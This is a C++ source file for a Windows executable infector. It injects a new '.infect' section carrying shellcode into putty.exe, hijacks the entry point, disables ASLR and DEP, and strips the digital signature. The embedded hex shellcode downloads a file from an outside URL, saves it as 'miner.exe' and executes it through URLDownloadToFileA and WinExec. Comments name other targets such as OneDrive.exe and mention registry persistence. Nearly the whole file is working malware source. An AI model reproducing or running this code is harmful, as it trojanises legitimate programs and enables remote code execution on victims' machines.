#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <filesystem>
#include "PE.h"

using namespace std;

std::size_t align_up(std::size_t size, std::size_t alignment)
{
	auto reminder = size % alignment;

	if (reminder != 0)
		size += (alignment - reminder);

	return size;
}

void Inject_New_Section(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
{
	auto Parsed_PE = PE::ParsePE(pe_file);
	cout << "PE file parsed" << endl;

	// -------- Add the redirect code to the original header in the injection code ---------

	// imgBase is the base VA. AOEP is an offset of this address
	// Adding them we obtain the in-memory address (Virtual Address)
	auto imagebase = Parsed_PE.inh32.OptionalHeader.ImageBase;
	auto OEP = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
	auto image_base_OEP = imagebase + OEP;

	// The addresses are stored in little endian in memory
	char push[] = "\x68"; // push
	char esp[] = "\xff\x24\x24"; // jmp [esp]
	char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
	auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 3; // -3 for the end teminator \0, hex_oep doens't have it as its defined char by char.

	// ------------- Construction of Image Section Headers -----------------

	// Increment the number of sections because we will add another one
	Parsed_PE.inh32.FileHeader.NumberOfSections++;
	// index of the new section
	auto new_section = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
	// Vector of section headers, one header extra for the new section
	vector<IMAGE_SECTION_HEADER> new_ish(Parsed_PE.inh32.FileHeader.NumberOfSections + 1);

	// Copy the current Image Section Headers to the new vector of headers
	for (size_t i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections - 1; ++i)
	{
		new_ish[i] = Parsed_PE.ish[i];
	}

	// Overwrite the original ISH
	Parsed_PE.ish = new_ish;

	// ------------- Construction of the new Section Header -----------------

	// Section virtual address: VA of previous section + previous section size + alignment.
	// Next section VA always will be in the next multiple Section Alignment of the previous section VirtualSize.
	// Usually, Virtual size is a page (4069bytes, 0x1000).
	Parsed_PE.ish[new_section].VirtualAddress = Parsed_PE.ish[new_section - 1].VirtualAddress 
		+ align_up(Parsed_PE.ish[new_section - 1].Misc.VirtualSize, Parsed_PE.inh32.OptionalHeader.SectionAlignment);
	// Name of the new section (8 bytes size)
	memcpy(Parsed_PE.ish[new_section].Name, ".infect", 8);

	// Point to Raw Data: P2RD of previous section plus last section size of raw data
	// Raw data is in file data, not in memory (like VA). Therefore its already aligned.
	Parsed_PE.ish[new_section].PointerToRawData = Parsed_PE.ish[new_section - 1].PointerToRawData + Parsed_PE.ish[new_section - 1].SizeOfRawData;
	// Current Virtual Size
	Parsed_PE.ish[new_section].Misc.VirtualSize = inj_size;

	// Current Size of Raw Data, Need to be multiple of file aligment (usually 200).
	Parsed_PE.ish[new_section].SizeOfRawData = align_up(inj_size, Parsed_PE.inh32.OptionalHeader.FileAlignment);

	// Characteristics of the new section
	Parsed_PE.ish[new_section].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

	// New Size of the image: last section (our section in this case) VA + size of last section aligned.
	// Why not modify it from last size of image?
	Parsed_PE.inh32.OptionalHeader.SizeOfImage = Parsed_PE.ish[new_section].VirtualAddress 
		+ align_up(Parsed_PE.ish[new_section].SizeOfRawData, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

	// New Address of entry point of the PE to our new section
	auto AEP = Parsed_PE.ish[new_section].VirtualAddress;
	Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = AEP;

	// Inject the code
	auto size_of_code_section = Parsed_PE.ish[new_section].SizeOfRawData;
	shared_ptr<char> n_section(new char[size_of_code_section] {}, std::default_delete<char[]>());

	auto inj_section = n_section.get();
	memcpy(inj_section, xcode, size_of_xcode - 1);
	memcpy(inj_section + size_of_xcode - 1, push, sizeof push);
	memcpy(inj_section + size_of_xcode + sizeof push - 2, hex_oep, sizeof hex_oep);
	memcpy(inj_section + sizeof hex_oep + sizeof push + size_of_xcode - 2, esp, sizeof esp);

	Parsed_PE.Sections.push_back(n_section);

	// ------------------- Extra PE necessary work ---------------------------

	// disable ASLR
	Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	Parsed_PE.inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
	Parsed_PE.inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
	Parsed_PE.inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

	// disable DEP
	Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

	// Posar a 0 la taula de certificats per a que no hi hagi signatura digital
	Parsed_PE.inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
	Parsed_PE.inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

	auto size_of_changed_pe = size_of_pe + size_of_code_section;

	PE::WriteBinary(Parsed_PE, out_path, size_of_changed_pe);

}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	//register for user startup Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run or Run once
	//char file_to_infect[] = "C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"; //no need for admin, run at startup
	//char file_to_infect[] = "C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe";
	char file_to_infect[] = "putty.exe";
	char new_name[] = "putty_aleix.exe";

	//auto outfile = argv[2];
	//auto infile = argv[1];
	auto outfile = new_name;
	auto infile = file_to_infect;

	// Open the binary to inject the code. 32 bits please.
	tuple<bool, char*, fstream::pos_type>  bin = PE::OpenBinary(infile);
	if (!get<0>(bin))
	{
		cout << "Error to open file";
		return EXIT_FAILURE;
	}
	char* PE_file = get<1>(bin);
	size_t size_of_pe = get<2>(bin);

	// Open MessageBox
	// Internet
	//char xcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
	// Compilat a Linux desde asm, problemes per posar mes text. ASM with .exit part stripped, pot tenir problemes d'estabilitat
	//char xcode[] = "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x48\x6f\x6c\x61\x89\xe7\x52\x68\x55\x77\x55\x00\x89\xe1\x52\x57\x51\x52\xff\xd0";
	char xcode[] = "\xeb\x6e\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xe8\x98\xff\xff\xff\x5f\x83\xef\xaf\xeb\x05\xe8\xf0\xff\xff\xff\x68\x8e\x4e\x0e\xec\x53\xe8\x97\xff\xff\xff\x31\xc9\x66\xb9\x6f\x6e\x51\x68\x75\x72\x6c\x6d\x54\xff\xd0\x68\x36\x1a\x2f\x70\x50\xe8\x7d\xff\xff\xff\x31\xc9\x51\x51\x8d\x37\x83\xc6\xf6\x8d\x16\x52\x57\x51\xff\xd0\x68\x98\xfe\x8a\x0e\x53\xe8\x62\xff\xff\xff\x41\x51\x56\xff\xd0\xeb\x43\x6d\x69\x6e\x65\x72\x2e\x65\x78\x65\x00\x68\x74\x74\x70\x3a\x2f\x2f\x74\x68\x65\x2e\x65\x61\x72\x74\x68\x2e\x6c\x69\x2f\x7e\x73\x67\x74\x61\x74\x68\x61\x6d\x2f\x70\x75\x74\x74\x79\x2f\x6c\x61\x74\x65\x73\x74\x2f\x77\x33\x32\x2f\x70\x75\x74\x74\x79\x2e\x65\x78\x65\x00\x90\x90";

	Inject_New_Section(PE_file, size_of_pe, xcode, sizeof xcode, outfile);

	return 0;
}